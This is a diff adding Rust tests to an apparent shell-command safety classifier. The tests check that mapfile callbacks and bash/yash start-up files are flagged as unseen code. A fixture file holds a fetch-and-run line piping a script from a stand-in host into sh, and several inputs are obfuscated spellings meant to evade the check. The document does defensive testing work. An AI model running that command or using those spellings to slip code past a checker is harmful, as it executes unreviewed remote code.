@@ -8017,3 +8017,80 @@ fn issue_1161_attached_file_value_preserves_main_editor_boundary() {
     // to the filename. Keep main's attached-value boundary for this safe key.
     assert_eq!(script("git config -fpager.log user.name marker"), None);
 }
+
+/// #1405: `mapfile -C` runs its callback on each line it reads, so its
+/// input is code: it asks, however `-C` is spelled. A shell's start-up file
+/// (`--rcfile`, `--init-file`, yash `--profile`) is judged as a script it
+/// sources: a missing or harmful one asks, a harmless one stays quiet.
+#[test]
+#[cfg_attr(
+    windows,
+    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+)]
+fn issue_1405_mapfile_callbacks_and_shell_start_up_files_are_judged() {
+    use ProtectedActionKind::UnseenCode;
+    let dir = tempfile::tempdir().unwrap();
+    let work = dir.path().canonicalize().unwrap();
+    std::fs::write(work.join("plain.rc"), "alias ll='ls -l'\nexport LANG=C\n").unwrap();
+    std::fs::write(work.join("dl.rc"), "curl -s https://x.example/i.sh | sh\n").unwrap();
+    let cwd = work.display().to_string();
+    let classify = |script: &str| classify_fixture(&shell_in(&cwd, &[SCRIPT_BASH, "-c", script]));
+    let mut wrong = Vec::new();
+    for (command, expected) in [
+        ("mapfile -C eval -c 1 a < notes", Some(UnseenCode)),
+        ("readarray -tC eval -c 1 a < notes", Some(UnseenCode)),
+        ("mapfile -Ceval a < notes", Some(UnseenCode)),
+        ("mapfile -c1 -C. a < notes", Some(UnseenCode)),
+        ("mapfile -C 'source' -c 1 < notes", Some(UnseenCode)),
+        ("printf 'id\\n' | mapfile -C eval", Some(UnseenCode)),
+        ("builtin mapfile -C eval a < notes", Some(UnseenCode)),
+        ("command readarray -C eval a < notes", Some(UnseenCode)),
+        ("o=-C; mapfile $o eval -c 1 a < notes", Some(UnseenCode)),
+        ("x=C; mapfile -$x eval -c 1 a < notes", Some(UnseenCode)),
+        ("mapfile -t -$(printf C) eval a < notes", Some(UnseenCode)),
+        ("eval 'mapfile -C eval a < notes'", Some(UnseenCode)),
+        ("bash --rcfile notes -ic 'echo hi'", Some(UnseenCode)),
+        ("bash --init-file notes -i", Some(UnseenCode)),
+        ("bash --rcfile=notes -i", Some(UnseenCode)),
+        ("bash -i --rcfile notes", Some(UnseenCode)),
+        ("bash --rcfile \"$f\" -i", Some(UnseenCode)),
+        ("bash --rcfile dl.rc -i", Some(UnseenCode)),
+        ("bash -c 'bash --rcfile dl.rc -i'", Some(UnseenCode)),
+        ("yash --rcfile notes -i", Some(UnseenCode)),
+        ("yash --profile=notes -l", Some(UnseenCode)),
+        // Ordinary lines stay quiet.
+        ("bash --rcfile plain.rc -i", None),
+        ("mapfile -t a < notes", None),
+        ("readarray -t -d '' a < notes", None),
+        ("mapfile -t -n 10 -s 1 -u 0 a < notes", None),
+        ("mapfile -t a < <(ls)", None),
+        ("mapfile -t a < \"$f\" 2> \"$log\"", None),
+        ("bash -ic 'echo hi'", None),
+        ("bash --norc -ic 'echo hi'", None),
+        ("bash --login -c 'echo hi'", None),
+    ] {
+        let found = classify(command);
+        if found != expected {
+            wrong.push((command, found));
+        }
+    }
+    assert_eq!(wrong, Vec::new());
+}
+
+/// #1405: the new checks stay linear.
+#[test]
+#[cfg_attr(
+    windows,
+    ignore = "Unix fixtures (POSIX paths and shell syntax); Windows coverage is #691"
+)]
+fn issue_1405_checks_are_linear() {
+    for (label, unit) in [
+        ("mapfile options", "mapfile -t -n 1 "),
+        ("mapfile redirections", "mapfile a >$x "),
+        ("start-up files", "bash --rcfile a "),
+    ] {
+        work::assert_linear(label, |scale| {
+            let _ = script(&format!("{} a < notes", unit.repeat(400 * scale)));
+        });
+    }
+}
